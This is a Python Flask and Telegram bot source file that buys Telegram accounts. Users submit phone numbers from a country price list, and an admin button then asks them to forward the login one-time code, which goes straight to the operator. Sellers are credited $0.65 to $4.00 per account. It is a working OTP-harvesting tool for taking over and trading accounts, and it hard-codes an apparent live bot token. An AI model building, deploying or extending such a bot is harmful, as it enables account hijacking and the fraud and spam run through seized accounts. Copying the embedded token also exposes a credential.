import os
import json
import logging
from datetime import datetime
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# --- CONFIG ---
TOKEN = "8266639049:AAFvQYw-ax6y94S2zH_oMg7jA2Q1Dxh6yro"
ADMIN_ID = 1378825382
CHANNEL_LINK = "https://t.me/NR_receiver_News"
WEBHOOK_PATH = "/webhook"  # keep this path in Render
WEBHOOK_URL = "https://sell-telegram.onrender.com"  # your render url (used for instructions)

# --- STORAGE ---
USER_FILE = "users.json"
ORDER_FILE = "orders.json"

def load_data(file):
    if not os.path.exists(file):
        return {}
    with open(file, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_data(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=2)

# ensure files exist
if not os.path.exists(USER_FILE):
    save_data(USER_FILE, {})
if not os.path.exists(ORDER_FILE):
    save_data(ORDER_FILE, {})

users = load_data(USER_FILE)
orders = load_data(ORDER_FILE)

# --- LOGGER ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- BOT APP ---
app = Flask(__name__)
application = Application.builder().token(TOKEN).build()

# --- COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    user = update.effective_user

    if user_id not in users:
        users[user_id] = {
            "name": user.full_name,
            "balance": 0.0,
            "referrals": 0,
            "accounts_sold": 0,
        }
        save_data(USER_FILE, users)

        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)],
            [InlineKeyboardButton("➡️ Continue to Menu", callback_data="continue_menu")]
        ]
        await update.message.reply_text(
            "👋 Welcome! Please join our channel first:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            "🎉 Welcome to Robot!\n\n"
            "Enter your phone number with the country code.\n"
            "Example: +62xxxxxxx\n\n"
            "Type /cap to see available countries."
        )

async def cap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """📋 Available Countries

🇵🇭 +63  | 💰 0.65$ | ⏰ 1800s
🇸🇻 +503 | 💰 0.70$ | ⏰ 600s
🇮🇱 +972 | 💰 0.80$ | ⏰ 1800s
🇵🇸 +970 | 💰 0.85$ | ⏰ 600s
🇳🇿 +64  | 💰 1.10$ | ⏰ 600s
🇹🇷 +90  | 💰 1.15$ | ⏰ 600s
🇲🇩 +373 | 💰 1.15$ | ⏰ 600s
🇬🇱 +299 | 💰 1.45$ | ⏰ 600s
🇨🇿 +420 | 💰 1.65$ | ⏰ 600s
🇹🇼 +886 | 💰 2.10$ | ⏰ 600s
🇳🇱 +31  | 💰 2.15$ | ⏰ 600s
🇪🇸 +34  | 💰 3.40$ | ⏰ 600s
🇫🇷 +33  | 💰 3.50$ | ⏰ 600s
🇩🇪 +49  | 💰 4.00$ | ⏰ 600s

🌍 Total Countries: 14
"""
    await update.message.reply_text(text)

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in users:
        await update.message.reply_text("⚠️ You don’t have a profile yet. Type /start first.")
        return

    user = users[user_id]
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    text = (
        f"👤 Name: {user['name']}\n"
        f"💰 Balance: ${user['balance']:.2f}\n"
        f"👥 Total Referrals: {user['referrals']}\n"
        f"📱 Accounts Sold: {user['accounts_sold']}\n"
        f"🕒 Last Check: {now}"
    )

    keyboard = [[InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # cancel any user's pending order (if exists)
    user_id = str(update.effective_user.id)
    if user_id in orders and orders[user_id]["status"] != "completed":
        del orders[user_id]
        save_data(ORDER_FILE, orders)
        await update.message.reply_text("✅ Your pending sell has been cancelled.")
    else:
        await update.message.reply_text("ℹ️ You have no pending sell to cancel.")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Use the commands set in BotFather. /start, /cap, /balance, /cancel, /help")

# --- MESSAGE HANDLER (numbers + otp) ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = str(update.effective_user.id)

    # If user sends a phone number (starts with + and digits)
    if text.startswith("+") and text[1:].isdigit():
        # Save order
        orders[user_id] = {"number": text, "status": "pending", "created_at": datetime.utcnow().isoformat()}
        save_data(ORDER_FILE, orders)

        await update.message.reply_text("⏳ Processing please wait...")

        # Notify admin with inline buttons
        keyboard = [
            [InlineKeyboardButton("✅ Request OTP", callback_data=f"reqotp_{user_id}")],
            [InlineKeyboardButton("❌ Cancel Deal", callback_data=f"cancel_{user_id}")]
        ]
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📩 New number submitted:\n{text}\nUser ID: {user_id}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    # If user sends OTP text and admin previously requested it
    if user_id in orders and orders[user_id].get("status") == "otp_requested":
        otp = text
        orders[user_id]["status"] = "otp_submitted"
        orders[user_id]["otp"] = otp
        orders[user_id]["otp_submitted_at"] = datetime.utcnow().isoformat()
        save_data(ORDER_FILE, orders)

        # Send OTP to admin with approve/retry/reject buttons
        keyboard = [
            [InlineKeyboardButton("🔄 Request Another Code", callback_data=f"admin_retry_{user_id}")],
            [InlineKeyboardButton("✅ Approve", callback_data=f"admin_approve_{user_id}")],
            [InlineKeyboardButton("❌ Reject", callback_data=f"admin_reject_{user_id}")]
        ]
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=(f"🔐 OTP received for User {user_id}\nNumber: {orders[user_id]['number']}\nOTP: {otp}"),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        await update.message.reply_text("✅ OTP received. Please wait for admin review.")
        return

    # Otherwise unknown text
    await update.message.reply_text("⚠️ Message not recognized. Send phone number (+countrycode) or use /cap.")

# --- CALLBACK HANDLER ---
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    # withdraw button pressed by user
    if data == "withdraw":
        user_id = str(query.from_user.id)
        if user_id not in users:
            await query.edit_message_text("⚠️ You don’t have a profile yet. Type /start first.")
            return
        bal = users[user_id]["balance"]
        if bal < 3:
            await query.edit_message_text("⚠️ Insufficient balance (minimum $3).")
        else:
            await query.edit_message_text("✅ Withdrawal request submitted! Admin will process.")
            # optionally notify admin here

    # Admin requested OTP for a user's order
    elif data.startswith("reqotp_") or data.startswith("admin_reqotp_"):
        # data could be reqotp_userid
        parts = data.split("_")
        order_user_id = parts[1]
        if order_user_id in orders:
            orders[order_user_id]["status"] = "otp_requested"
            orders[order_user_id]["otp_requested_at"] = datetime.utcnow().isoformat()
            save_data(ORDER_FILE, orders)
            # inform the user to send OTP
            await context.bot.send_message(chat_id=int(order_user_id),
                                           text=f"🇹🇼 Enter the code sent to the number {orders[order_user_id]['number']}")
            await query.edit_message_text(f"✅ OTP requested from user {order_user_id}.")
        else:
            await query.edit_message_text("Order not found.")

    elif data.startswith("cancel_"):
        parts = data.split("_")
        order_user_id = parts[1]
        if order_user_id in orders:
            orders[order_user_id]["status"] = "cancelled"
            save_data(ORDER_FILE, orders)
            await context.bot.send_message(chat_id=int(order_user_id), text="❌ Your deal has been cancelled by admin.")
            await query.edit_message_text(f"❌ Order from {order_user_id} cancelled.")
        else:
            await query.edit_message_text("Order not found.")

    elif data.startswith("admin_reject_"):
        order_user_id = data.split("_", 2)[2]
        if order_user_id in orders:
            orders[order_user_id]["status"] = "rejected"
            save_data(ORDER_FILE, orders)
            await context.bot.send_message(chat_id=int(order_user_id), text="❌ Your sell request has been rejected.")
            await query.edit_message_text(f"❌ Order {order_user_id} rejected.")
        else:
            await query.edit_message_text("Order not found.")

    elif data.startswith("admin_retry_"):
        order_user_id = data.split("_", 2)[2]
        if order_user_id in orders:
            orders[order_user_id]["status"] = "otp_requested"
            save_data(ORDER_FILE, orders)
            await context.bot.send_message(chat_id=int(order_user_id),
                                           text=f"🔄 Please send another OTP for number {orders[order_user_id]['number']}.")
            await query.edit_message_text(f"🔄 Requested another OTP from {order_user_id}.")
        else:
            await query.edit_message_text("Order not found.")

    elif data.startswith("admin_approve_"):
        order_user_id = data.split("_", 2)[2]
        if order_user_id in orders:
            # determine price from the number prefix (simple matching using /cap list)
            num = orders[order_user_id]["number"]
            # price logic: map prefixes to price exactly as earlier cap list (simplified)
            price_map = {
                "+63": 0.65, "+503": 0.70, "+972": 0.80, "+970": 0.85, "+64": 1.10,
                "+90": 1.15, "+373": 1.15, "+299": 1.45, "+420": 1.65, "+886": 2.10,
                "+31": 2.15, "+34": 3.40, "+33": 3.50, "+49": 4.00
            }
            price = 0.0
            for prefix, p in price_map.items():
                if num.startswith(prefix):
                    price = p
                    break

            # update user balance and sold count
            uid = order_user_id
            if uid not in users:
                users[uid] = {"name": f"User {uid}", "balance": 0.0, "referrals": 0, "accounts_sold": 0}

            users[uid]["balance"] += price
            users[uid]["accounts_sold"] += 1
            save_data(USER_FILE, users)

            orders[order_user_id]["status"] = "completed"
            orders[order_user_id]["price"] = price
            orders[order_user_id]["completed_at"] = datetime.utcnow().isoformat()
            save_data(ORDER_FILE, orders)

            await context.bot.send_message(chat_id=int(order_user_id),
                                           text=(f"✅ Your account has been successfully sold!\n"
                                                 f"💰 ${price:.2f} credited to your balance."))
            await query.edit_message_text(f"✅ Order {order_user_id} approved and user credited ${price:.2f}.")
        else:
            await query.edit_message_text("Order not found.")

# --- SETUP HANDLERS ---
application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("cap", cap))
application.add_handler(CommandHandler("balance", balance))
application.add_handler(CommandHandler("cancel", cancel_cmd))
application.add_handler(CommandHandler("help", help_cmd))

application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
application.add_handler(CallbackQueryHandler(callback_handler))

# --- FLASK ROUTE ---
@app.route(WEBHOOK_PATH, methods=["POST"])
def webhook():
    # receive Telegram update and push to the application's update queue
    update = Update.de_json(request.get_json(force=True), application.bot)
    application.update_queue.put_nowait(update)
    return "ok"

@app.route("/")
def home():
    return "Bot is running!", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    # Flask will be served by Render; application (telegram) will process incoming updates pushed via webhook()
    app.run(host="0.0.0.0", port=port)
